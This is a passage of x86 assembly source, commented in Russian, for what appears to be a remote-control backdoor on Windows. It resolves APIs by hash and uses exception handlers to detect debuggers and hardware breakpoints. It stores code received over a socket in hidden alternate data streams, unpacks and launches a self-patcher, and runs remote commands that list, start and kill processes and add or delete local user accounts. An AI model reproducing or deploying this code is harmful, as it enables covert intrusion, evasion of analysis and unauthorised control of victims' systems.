	jne .continue_execution
	
	mov eax, [esi + EXCEPTION_RECORD.ExceptionAddress] ; адрес ислключения
	mov esi, [pContext]
	add eax, 0x05			; вычисляем адрес, с котор продолжим выполнение
	mov [esi + CONTEXT.regEip], eax
	
	and dword [esi + CONTEXT.regFlag], 0xFFFFFEFF 
	
	; обозначаем, что исключение обработано
	mov eax, 0
	ret 

; отдаем следующему обработчику
.continue_execution:
	mov eax, 1
	ret 
endp

; Обработчик деления на 0
; Проверка на заполненность DR7
proc sehDr7 pRecord, pFrame, pContext, pParam
	mov esi, [pRecord]
	cmp [esi + EXCEPTION_RECORD.ExceptionCode], 0C0000094h	; причина исключения деление на 0?
	jne .continue_execution
	
	mov esi, [pContext]
	; Перемещаем eip на след инструкцию после деления на 0
	mov eax, [esi + CONTEXT.regEip]
	add eax, 0x02
	mov [esi + CONTEXT.regEip], eax	; в регистр eip помещаем адрес инструкции, с которой продолжить выполнение
	
	; Обнаружение аппаратных точек 
	cmp dword [esi + CONTEXT.iDr7], 0x00
	je .no_dr7
	jmp close_client_conn

.no_dr7:
	; обозначаем, что исключение обработано
	mov eax, 0
	ret 

; отдаем следующему обработчику
.continue_execution:
	mov eax, 1
	ret 
endp

; Обработчик отсутствия доступа
; Устанавливает TF
; В стеке хранится eflags (pushfd) перед вызовом обработчика
; popfd после обработчика должно быть
proc sehSetTF pRecord, pFrame, pContext, pParam
	mov esi, [pRecord]
	cmp [esi + EXCEPTION_RECORD.ExceptionCode], 0xC0000005	
	jne .continue_execution
	
; обрабатываем деление на 0
	mov esi, [pContext]
	
	mov eax, [esi + CONTEXT.regEip]
	add eax, 0x06
	mov [esi + CONTEXT.regEip], eax	; в регистр eip помещаем адрес инструкции, с которой продолжить выполнение
		
	or dword [esp + 0x5A0], 0x100		; измен зн в стеке у флагов
	; or dword [esi + CONTEXT.regFlag], 0x100 сразу отлавливается след обработчиком
	
	; обозначаем, что исключение обработано
	mov eax, 0
	ret 

; отдаем следующему обработчику
.continue_execution:
	mov eax, 1
	ret 
endp

; ==============================================	


; ========== БЛОК ФУНКЦИЙ ПО ВЗАИМОДЕЙСТВИЮ ФУНКЦИЯМИ ==========	

; ----- ФУНКЦИЯ ПОЛУЧЕНИЯ НАЗВАНИЯ ФАЙЛА -----
; IN esi - строка
; OUT buffer - название
proc get_filename
	; обработка ком. строки
	xor ecx, ecx				; счетчик символов
	mov dl, 0x00				; индикатор второй "
	
.find_file_name:
	inc ecx
	lodsb
	
	cmp al, 0x5C				; '\'
	je .next_word
	
	cmp al, 0x00				; '\0'
	je .save_file_name
	
	cmp al, 0x22				; '"'
	jne .find_file_name
	
	inc dl
	cmp dl, 0x02
	je .save_file_name
	jmp .next_word
	
.next_word:
	xor ecx, ecx
	jmp .find_file_name
	
.save_file_name:
	sub esi, ecx				; переходим в начало названия файла
	mov edi, buffer
	dec ecx
	
	; Записываем название основного файла в буфер
.save_file_name_iter:
	movsb
	loop .save_file_name_iter
;;; ОБЯЗАТЕЛЬНО УБАРТЬ DEC EDI ЕСЛИ ЗАПУСК БЕЗ ОТЛАДЧИКА!!!!!!!!!
	;dec edi						
	mov byte [edi], 0x00		; конец строки

	ret
endp

; ----- ФУНКЦИЯ ЗАПИСИ ФУНКЦИИ В ФАЙЛ -----
; IN [buffer + 0x40] - 0x00 или 0x01 (del и add соотв)
; OUT [filename] 	- адрес строки названия файла
; OUT [hCode] 	- дескриптор :code
proc write_code
	; Получаем VA GetCommandLineA
	mov esi, [addr_kernel32_table]
	mov ebx, 0xC41DB48D
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	call eax					; GetCommandLineA
	mov dword [filename], eax	; сохраняем адрес строки
	
	mov esi, eax
	call get_filename
	
	mov byte [edi], 0x3A		;':'
	inc edi
	mov byte [edi], 0x63		;'c'
	inc edi
	mov byte [edi], 0x6F		;'o'
	inc edi
	mov byte [edi], 0x64		;'d'
	inc edi
	mov byte [edi], 0x65		;'e'
	inc edi
	mov byte [edi], 0x00		; конец строки
	
	; Получаем VA CreateFileA
	mov esi, [addr_kernel32_table]
	mov ebx, 0x7B2B7316		
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00					; hTemplateFile
	push 0x80 					; normal dwFlagsAndAttributes
	push 0x02					; CREATE_ALWAYS dwCreationDisposition
	push 0x00					; lpSecurityAttributes
	push 0x00 					; dwShareMode
	push 0xC0000000 			; read write dwDesiredAccess
	push buffer					; lpFileName
	call eax					; CreateFileA
	
	cmp eax, 0x00
	jle end_prog				; если файл не открылся
	
	; Сохраняем дескриптор
	mov [hCode], eax
	
	; Получаем VA WriteFile
	mov esi, [addr_kernel32_table]
	mov ebx, 0x0684B82A			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00  					; lpOverlapped
	lea ecx, [buffer + 0x30]
	push ecx 					; lpNumberOfBytesWritten
	push 0x01 					; nNumberOfBytesToWrite
	lea ecx, [buffer + 0x40]
	push ecx					; lpBuffer
	push [hCode] 				; hFile
	call eax					; WriteFile
	
	cmp eax, 0x00
	je end_prog
	

.recv_file:	
	call zeroBuffer
	; Получаем VA recv
	mov esi, [addr_ws2_32_table]
	mov ebx, 0xDB800081			
	call get_func_addr
	
	cmp eax, 0x00
	je close_client_conn
	
	push 0						; flags
	push 0x0200					; len
	push buffer					; *buf
	push [client_conn]			; s
	call eax					; recv
	
	cmp eax, 0x00
	jge .if_end_recv		
	
	; ошибка recv 
	; Получаем offset exit
	mov esi, my_func_table
	mov ebx, 0x25400080	
	call get_func_addr
	
	cmp eax, 0x00
	je close_client_conn
	
	add eax, [VA_text_section]	; получаем VA функции
	push eax
	ret

.if_end_recv:
	cmp eax, 0x01		; один ли символ получен
	jne .write_data
	
	cmp byte [buffer], 0x01	
	je .end_write_code	; завершаем прием
	
; Сохраняем полученные данные	
.write_data:
	push eax			; сохр колво символов
	
	; Получаем VA WriteFile
	mov esi, [addr_kernel32_table]
	mov ebx, 0x0684B82A			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	pop ecx					; колво символов
	push 0x00  					; lpOverlapped
	push sbuf 					; lpNumberOfBytesWritten
	push ecx					; nNumberOfBytesToWrite
	push buffer					; lpBuffer
	push [hCode] 				; hFile
	call eax					; WriteFile
	
	cmp eax, 0x00
	je end_prog
	
	jmp .recv_file

.end_write_code:
	; VA CloseHandle
	mov esi, [addr_kernel32_table]
	mov ebx, 0x28546828	
	call get_func_addr
	
	push [hCode]
	call eax

	ret
endp

; ----- ФУНКЦИЯ РАСПАКОВКИ -----
; https://codeby.net/threads/zipaem-fajl-vruchnuju-chast-2-raspakovschik.72114/
proc unpack_patch
	; Получаем VA VirtualAlloc
	mov esi, [addr_kernel32_table]
	mov ebx, 0x11A48A04
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	
	mov ecx, dword [compressed_patch] 	; ориг размер файла
	
	push 0x04			; flProtect
	push 0x3000			; flAllocationType
	push ecx 			; dwSize
	push 0x00			; lpAddress
	call eax			; VirtualAlloc
	
	cmp eax, 0x00
	je end_prog
	
	mov dword [addr_patch_buf], eax		; адрес 
	
	; Получаем VA CreateFileA 
	mov esi, [addr_kernel32_table]
	mov ebx, 0x7B2B7316		
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00					; hTemplateFile
	push 0x80 					; normal dwFlagsAndAttributes
	push 0x02					; CREATE_ALWAYS dwCreationDisposition
	push 0x00					; lpSecurityAttributes
	push 0x00 					; dwShareMode
	push 0xC0000000 			; read write dwDesiredAccess
	push buffer					; lpFileName
	call eax					; CreateFileA
	
	cmp eax, 0x00
	jle end_prog				; если файл не открылся
	
	; Сохраняем дескриптор
	mov [hPatch], eax
	
; Распаковываем 
	mov ecx, dword [szCompressed_patch]	; длина упакованных данных
	lea esi, [compressed_patch + 0x04]	; адрес начала данных
	mov edi, dword [addr_patch_buf] 	; адрес распаковки
	xor eax, eax 

.find:
	lodsb
	test al, 0x80
	jnz .dup
	
	push ecx
	push eax
	mov ecx, eax
	rep movsb
	pop eax
	pop ecx
	sub ecx, eax
	
	jmp .next

.dup:
	sub al, 0x80
	push ecx
	mov ecx, eax
	lodsb
	rep stosb
	pop ecx
	dec ecx
	
.next:
	cmp ecx, 0x00
	jl .stop
	loop .find
.stop:
; Записываем распакованные данные в файл 
	
	; Получаем VA WriteFile
	mov esi, [addr_kernel32_table]
	mov ebx, 0x0684B82A			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	mov ecx, dword [compressed_patch]	; размер файла оригинала 
	push 0x00  					; lpOverlapped
	push sbuf 					; lpNumberOfBytesWritten
	push ecx					; nNumberOfBytesToWrite
	push [addr_patch_buf]		; lpBuffer
	push [hPatch] 				; hFile
	call eax					; WriteFile
	
	cmp eax, 0x00
	je end_prog
	
	
	; VA CloseHandle
	mov esi, [addr_kernel32_table]
	mov ebx, 0x28546828	
	call get_func_addr
	
	push [hPatch]
	call eax
	
	ret
endp

; ----- ФУНКЦИЯ ДОБАВЛЕНИЯ ФУНКЦИИ -----
addFunc:
	mov byte [buffer + 0x40], 0x01
	jmp do_write_code
; ----- ФУНКЦИЯ УДАЛЕНИЕ ФУНКЦИИ -----
delFunc:
	mov byte [buffer + 0x40], 0x00
	
do_write_code:
	call write_code
	
; генерация названия файла для создания процесса
	; обработка ком. строки
	mov esi, [filename]				; строка
	call get_filename
	
	mov byte [edi], 0x3A		;':'
	inc edi
	mov byte [edi], 0x70		;'p'
	inc edi
	mov byte [edi], 0x61		;'a'
	inc edi
	mov byte [edi], 0x74		;'t'
	inc edi
	mov byte [edi], 0x63		;'c'
	inc edi
	mov byte [edi], 0x68		;'h'
	inc edi
	mov byte [edi], 0x00		; конец строки
	
	; Распаковка патчера
	call unpack_patch
	
; Запускаем процесс
	; Получаем VA CreateProcessA
	mov esi, [addr_kernel32_table]
	mov ebx, 0x5EFB9356
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push prinfo				; lpProcessInformation
	push stinfo				; lpStartupInfo
	push 0x00				; lpCurrentDirectory
	push 0x00 				; lpEnvironment
	push 0x00 				; dwCreationFlags
	push 0x00 				; bInheritHandles
	push 0x00 				; lpThreadAttributes
	push 0x00 				; lpProcessAttributes
	push 0x00 				; lpCommandLine
	push buffer				; lpApplicationName
	
	call eax				; CreateProcessA
	
	; завершаем работу программы
	jmp end_prog

; ==============================================================

	
; дальеш идет динамический фукнционал	
; ========== БЛОК КОМАНД ПО ВЗАИМОДЕЙСТВИЮ С ПРИЛОЖЕНИЕМ ==========	
	align 0x10
	
; ----- ФУНКЦИЯ ЗАКРЫТИЯ ТЕКУЩЕГО ПОДКЛЮЧЕНИЯ, ПРИЕМ СЛЕД. -----		
exit:
	; Вычисляем VA get_func_addr
	mov eax, [VA_text_section]
	add eax, [offset_get_func_addr]
	
	; Получаем VA closesocket
	mov esi, [addr_ws2_32_table]
	mov ebx, 0x4561D811		
	call eax
	
	; Вычисляем VA close_client_conn
	mov ebx, [VA_text_section]
	add ebx, [offset_close_client_conn]
	
	cmp eax, 0x00
	jne cont_exit
	push ebx					; close_client_conn
	ret

cont_exit:
	push [client_conn]
	call eax					; closesocket
	
	; Вычисляем VA next_accept
	mov ebx, [VA_text_section]
	add ebx, [offset_next_accept]
	
	push ebx		
	ret

	align 0x10	
	
; ----- ФУНКЦИЯ ЗАВЕРШЕНИЯ ПРОГРАММЫ -----	
end1:
	; Вычисляем VA next_accept
	mov ebx, [VA_text_section]
	add ebx, [offset_close_client_conn]
	
	call ebx

	align 0x10
; =================================================================	

; ========== БЛОК КОМАНД ПО ВЗАИМОДЕЙСТВИЮ С ФС ==========	
; ----- ФУНКЦИЯ ПОЛУЧЕНИЯ ПОЛНОГО ПУТИ -----
; IN 	esi - параметры	(не используется)
; OUT 	eax - результат фукнции (если ошибка, то 0)
; OUT 	ebx - нужен ли вывод результата (1 - да, 0 - нет)
pwd:
	; Вычисляем VA get_func_addr
	mov eax, [VA_text_section]
	add eax, [offset_get_func_addr]
	
	; Получаем VA GetCurrentDirectoryA
	mov esi, [addr_kernel32_table]
	mov ebx, 0x5F5103D2	
	call eax
	
	; Вычисляем VA close_client_conn
	mov ebx, [VA_text_section]
	add ebx, [offset_close_client_conn]
	
	cmp eax, 0x00
	jne cont_pwd
	call ebx					; close_client_conn
	
cont_pwd:
	push buffer					; lpBuffer
	push 0x0200					; nBufferLength
	call eax					; GetCurrentDirectoryA - возвращает длину строки
	
	mov ebx, 0x01
	
	cmp eax, 0x00
	je err_pwd					; ошибка GetCurrentDirectoryA
	
	inc eax						; чтобы захватить \0 байт
	ret

err_pwd:
	ret

	align 0x10
	
; ----- ФУНКЦИЯ СМЕНЫ ДИРЕКТОРИИ -----
; IN 	esi - параметр	(абс или относительный путь)
; OUT 	eax - результат фукнции (если ошибка, то 0)
; OUT 	ebx - нужен ли вывод результата (1 - да, 0 - нет)
cd:
	push esi				; lpPathName
	
	; Вычисляем VA get_func_addr
	mov eax, [VA_text_section]
	add eax, [offset_get_func_addr]
	
	; Получаем VA SetCurrentDirectoryA
	mov esi, [addr_kernel32_table]
	mov ebx, 0x5F6A03D2			
	call eax
	
	cmp eax, 0x00
	je err_cd
	
	call eax					; SetCurrentDirectoryA
	jmp ret_cd
	
err_cd:
	add esp, 0x04
	
ret_cd:
	xor ebx, ebx
	ret

	align 0x10

; ----- ФУНКЦИЯ СОЗДАНИЯ ДИРЕКТОРИИ -----
; IN 	esi - параметр	(абс или относительный путь)
; OUT 	eax - результат фукнции (если ошибка, то 0)
; OUT 	ebx - нужен ли вывод результата (1 - да, 0 - нет)
mkdir:
	push 0x00					; lpSecurityAttributes
	push esi					; lpPathName
	
	; Вычисляем VA get_func_addr
	mov eax, [VA_text_section]
	add eax, [offset_get_func_addr]
	
	; Получаем VA CreateDirectoryA
	mov esi, [addr_kernel32_table]
	mov ebx, 0x4A48A672			; CreateDirectoryA
	call eax
	
	cmp eax, 0x00
	je err_mkdir
	
	call eax
	jmp ret_mkdir
	
err_mkdir:
	add esp, 0x08
	
ret_mkdir:
	xor ebx, ebx
	ret

	align 0x10
; ========================================================		

; ========== БЛОК КОМАНД ПО ВЗАИМОДЕЙСТВИЮ С ПРОЦЕССАМИ ==========	
; ----- ФУНКЦИЯ ПРОСМОТРА ПРОЦЕССОВ -----
; IN 	esi - параметр	(не используется)
; OUT 	eax - результат фукнции (если ошибка, то 0)
; OUT 	ebx - нужен ли вывод результата (1 - да, 0 - нет)
ps:
	; Вычисляем VA get_func_addr
	mov eax, [VA_text_section]
	add eax, [offset_get_func_addr]
	
	; Получаем VA CreateToolhelp32Snapshot
	mov esi, [addr_kernel32_table]
	mov ebx, 0x8792BD3F			
	call eax
	
	push 0x00				; th32ProcessID
	push 0x02				; dwFlags = TH32CS_SNAPPROCESS
	call eax				; CreateToolhelp32Snapshot
	
	cmp eax, -1
	je err_ps
	
	mov [hSnapshot], eax
	
	; Вычисляем VA get_func_addr
	mov eax, [VA_text_section]
	add eax, [offset_get_func_addr]
	
	; VA Process32First
	mov esi, [addr_kernel32_table]
	mov ebx, 0xA7EF9AF1		
	call eax
	
	push pe32					; lppe
	push [hSnapshot]			; hSnapshot
	call eax					; Process32First
	
	cmp eax, 0x00
	je err_ps
	
	; Вычисляем VA send
	mov eax, [VA_text_section]
	add eax, [offset_send]
	
	mov ecx, 0x01
	mov edx, mesMore			; байт 0x02 означает, что сечас надо принимать инфо о процессах
	call eax					; send
	
	cmp eax, 0x00
	jge parse_processes
	
	; ошибка send
	; Вычисляем VA get_func_addr
	mov eax, [VA_text_section]
	add eax, [offset_get_func_addr]
	
	; Получаем offset exit
	mov esi, my_func_table
	mov ebx, 0x25400080	
	call eax
	
	cmp eax, 0x00
	jne t1
	
	; Вычисляем VA close_client_conn
	mov eax, [VA_text_section]
	add eax, [offset_close_client_conn]
	push eax
	ret

t1:	
	add eax, [VA_text_section]	; получаем VA функции
	push eax 					; exit
	ret
	
parse_processes:
	; формирование строки для отправки клиенту
	; Вычисляем VA zeroBuffer
	mov eax, [VA_text_section]
	add eax, [offset_zeroBuffer]
	call eax
	
	mov esi, pe32.szExeFile
	mov edi, buffer
	
	xor ecx, ecx				; счетчик итераций
write_name:
	inc ecx
	cmp byte [esi], 0x00
	je aligmentSpace
	movsb
	jmp write_name
	
aligmentSpace:
	mov eax, 0x1E				; 30 символов под имя
	sub eax, ecx
	cmp eax, 0x00
	jle write_other
	
	mov ecx, eax
aligmentSpaceIter:
	mov byte [edi], 0x20		; заполняем пробелами
	inc edi
	loop aligmentSpaceIter
	
write_other:
	call write_tab
	
	mov esi, pe32.th32ProcessID
	lodsd
	call hex2dec
	
	call write_tab
	
	mov esi, pe32.th32ParentProcessID
	lodsd
	call hex2dec
	
	call write_tab

	mov esi, pe32.cntThreads
	lodsd
	call hex2dec
	
	call write_tab

	mov esi, pe32.pcPriClassBase
	lodsd
	call hex2dec
	
	add edi, 0x02
	sub edi, buffer				; длина сообщения
	
	mov ecx, edi
	push ecx 
	
	; Вычисляем VA get_func_addr
	mov eax, [VA_text_section]
	add eax, [offset_get_func_addr]
	
	; Получаем VA Sleep
	mov esi, [addr_kernel32_table]
	mov ebx, 0x3D160072		
	call eax

	push 0xC8					; 200мс
	call eax					; Sleep	
	
	; Вычисляем VA send
	mov eax, [VA_text_section]
	add eax, [offset_send]
	
	pop ecx
	mov edx, buffer
	call eax					; отправляем инфо о процессе
	
	cmp eax, 0x00
	jge t3					
		
	; ошибка send
	; Вычисляем VA get_func_addr
	mov eax, [VA_text_section]
	add eax, [offset_get_func_addr]
	
	; Получаем offset exit
	mov esi, my_func_table
	mov ebx, 0x25400080	
	call eax
	
	cmp eax, 0x00
	jne t2
	
	; Вычисляем VA close_client_conn
	mov eax, [VA_text_section]
	add eax, [offset_close_client_conn]
	push eax
	ret

t2:	
	add eax, [VA_text_section]	; получаем VA функции
	push eax					; exit
	ret
	

t3:	
	; Вычисляем VA get_func_addr
	mov eax, [VA_text_section]
	add eax, [offset_get_func_addr]
	
	; Вычисляем VA Process32Next
	mov esi, [addr_kernel32_table]
	mov ebx, 0x277AF280		
	call eax
	
	push pe32
	push [hSnapshot]
	call eax					; Process32Next
	
	cmp eax, 0x00
	jne parse_processes
	
	mov eax, 0x01
	xor ebx, ebx
	ret
		
err_ps:
	xor eax, eax
	ret
	
proc write_tab
	mov byte [edi], 0x09		; '\t'
	inc edi
	mov byte [edi], 0x7C		; '|'
	inc edi
	mov byte [edi], 0x09		; '\t'
	inc edi
	ret
endp

; ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ПРЕОБРАЗОВАНИЯ ИЗ HEX В DEC 
; IN 	eax - hex число
; OUT 	edi - адрес записи числа
proc hex2dec
	xor ecx, ecx			; счетчик итераций
.iter:
	inc ecx
	mov ebx, 0x0A
	xor edx, edx
	div ebx
	add dl, '0'				; делим на 10 и остаток в аски перевод
	
	movzx ebx, dx
	push ebx
	
	test eax, eax
	jnz .iter
	
.write_dec:	
	pop ebx
	mov byte [edi], bl
	inc edi
	loop .write_dec
	ret
endp

	align 0x10
	
; ----- ФУНКЦИЯ ЗАПУСКА ПРИЛОЖЕНИЯ -----
; IN 	esi - название файла
; OUT 	eax - результат фукнции (если ошибка, то 0)
; OUT 	ebx - нужен ли вывод результата (1 - да, 0 - нет)
run:
	push esi
	
	; Вычисляем VA get_func_addr
	mov eax, [VA_text_section]
	add eax, [offset_get_func_addr]
	
	; Получаем VA CreateProcessA
	mov esi, [addr_kernel32_table]
	mov ebx, 0x5EFB9356			
	call eax
	
	pop esi
	
	push prinfo				; lpProcessInformation
	push stinfo				; lpStartupInfo
	push 0x00				; lpCurrentDirectory
	push 0x00 				; lpEnvironment
	push 0x00 				; dwCreationFlags
	push 0x00 				; bInheritHandles
	push 0x00 				; lpThreadAttributes
	push 0x00 				; lpProcessAttributes
	push 0x00 				; lpCommandLine
	push esi				; lpApplicationName
	
	call eax				; CreateProcessA
	
	test eax, eax
	je err_run
	
	mov eax, 0x01
	xor ebx, ebx
	ret
	
err_run:
	xor eax, eax 
	ret
	
	align 0x10

; ----- ФУНКЦИЯ ПРИНУДИТЕЛЬНОГО ЗАВЕРШЕНИЯ ПРОЦЕССА -----
; IN 	esi - PID
; OUT 	eax - результат фукнции (если ошибка, то 0)
; OUT 	ebx - нужен ли вывод результата (1 - да, 0 - нет)
term:	
	call dec2hex
	cmp ebx, 0xFFFFFFFF
	je err_term
	push ebx				; dwProcessId
	
	; Вычисляем VA get_func_addr
	mov eax, [VA_text_section]
	add eax, [offset_get_func_addr]
	
	; Получаем VA OpenProcess
	mov esi, [addr_kernel32_table]
	mov ebx, 0x46973493			; OpenProcess
	call eax	
					
	push 0x00				; bInheritHandle
	push 0x01				; dwDesiredAccess = PROCESS_TERMINATE 
	call eax				; OpenProcess
	
	test eax, eax
	je err_term
	push eax
	
	; Вычисляем VA get_func_addr
	mov eax, [VA_text_section]
	add eax, [offset_get_func_addr]
	
	; Получаем VA TerminateProcess
	mov esi, [addr_kernel32_table]
	mov ebx, 0x3D8862C7			; TerminateProcess
	call eax	
	
	pop ecx
	push 0x00				; uExitCode
	push ecx 				; hProcess
	call eax				; TerminateProcess
	
	test eax, eax
	je err_term
	
	mov eax, 0x01
	xor ebx, ebx
	ret
	
err_term:
	xor eax, eax 
	ret

; ----- ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ПРЕОБРАЗОВАНИЯ ИЗ DEC В HEX -----
; IN 	esi - строка с числом
; OUT 	ebx - число в hex (-1 - ошибка)
proc dec2hex
	xor ebx, ebx
	xor eax, eax 
	
.iter:
	lodsb
	cmp al, 0x00		; проверка на конец строки
	jne .do
	ret

.do:
	cmp al, 0x30
	jl .err_dec2hex
	cmp al, 0x39
	jg .err_dec2hex
	
	sub al, 0x30
	imul ebx, ebx, 0x0A
	add ebx, eax
	jmp .iter

.err_dec2hex:
	mov ebx, 0xFFFFFFFF
	ret
endp

	align 0x10
	
; ========== БЛОК КОМАНД ПО ВЗАИМОДЕЙСТВИЮ С УЧЕТНЫМИ ЗАПИСЯМИ ==========	
; ----- ФУНКЦИЯ СОЗДАНИЯ УЧЕТНОЙ ЗАПИСИ -----
; IN 	esi - строка логина и пароля
; OUT 	eax - результат фукнции (если ошибка, то 0)
; OUT 	ebx - нужен ли вывод результата (1 - да, 0 - нет)
addUser:
	push esi 		; сохраняем адрес строки

; Получаем адреса строк	
del_20:
	lodsb
	
	cmp al, 0x20
	je end_del_20
	
	cmp al, 0x00
	je err_addUser
	
	jmp del_20
	
end_del_20:
	mov byte [esi - 0x01], 0x00	; заменяем пробел на 0x00
	
	; esi уже указывает на пароль
	mov edi, unicode_password
	call ascii2unicode
	
	pop esi 	; адрес имени пользователя
	mov edi, unicode_username
	call ascii2unicode
	
	; Заполняем структру
	mov dword [userInfo.usri1_name], unicode_username
	mov dword [userInfo.usri1_password], unicode_password
	
	; Вычисляем VA get_func_addr
	mov eax, [VA_text_section]
	add eax, [offset_get_func_addr]
	
	; Получаем VA NetUserAdd
	mov esi, [addr_samcli_table]
	mov ebx, 0x51AB8B16			; NetUserAdd
	call eax	
	
	push 0x00                     ; Последний параметр: резерв для ошибки
    push userInfo                 ; Указатель на структуру USER_INFO_1
    push 0x01                     ; Уровень структуры (USER_INFO_1)
    push 0x00                     ; Локальный компьютер
    call eax
	
	test eax, eax
	jnz err_addUser
	
	mov eax, 0x01
	jmp ret_addUser
	
err_addUser:
	xor eax, eax 
	
ret_addUser:
	; чистим имя и пароль
	mov ecx, 0x64				; 100 
	mov esi, unicode_username
	
del_user_data1:
	dec ecx
	
	mov byte [esi + ecx], 0x00
	
	inc ecx 
	loop del_user_data1
	
	xor ebx, ebx
	ret

; ----- ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ СОЗДАНИЯ ПРЕКОДИРОВАНИЯ СТРОКИ -----
; IN esi - ascii
; IN/OUT edi - unicode
proc ascii2unicode
	xor eax, eax
	
.next_char:
	lodsb
	test al, al
	jz .done
	stosw
	jmp .next_char
	
.done:
	xor ax, ax
	stosw
	
	ret
endp
	
	align 0x10
; ----- ФУНКЦИЯ УДАЛЕНИЯ УЧЕТНОЙ ЗАПИСИ -----
; IN 	esi - строка логина
; OUT 	eax - результат фукнции (если ошибка, то 0)
; OUT 	ebx - нужен ли вывод результата (1 - да, 0 - нет)
delUser:
	mov edi, unicode_username
	
	xor eax, eax
next_char:
	lodsb
	test al, al
	jz done
	stosw
	jmp next_char
	
done:
	xor ax, ax
	stosw
	
	; Вычисляем VA get_func_addr
	mov eax, [VA_text_section]
	add eax, [offset_get_func_addr]
	
	; Получаем VA NetUserDel
	mov esi, [addr_samcli_table]
	mov ebx, 0x546c0b8e			; NetUserDel
	call eax	
	
	push unicode_username	; username
	push 0x00				; servername
    call eax

	test eax, eax
	jnz err_delUser
	
	mov eax, 0x01
	jmp ret_delUser
	
err_delUser:
	xor eax, eax 
	
ret_delUser:
	; чистим имя и пароль
	mov ecx, 0x32				; 50
	mov esi, unicode_username
	
del_user_data2:
	dec ecx
	
	mov byte [esi + ecx], 0x00
	
	inc ecx 
	loop del_user_data2
	
	xor ebx, ebx
	ret

	align 0x10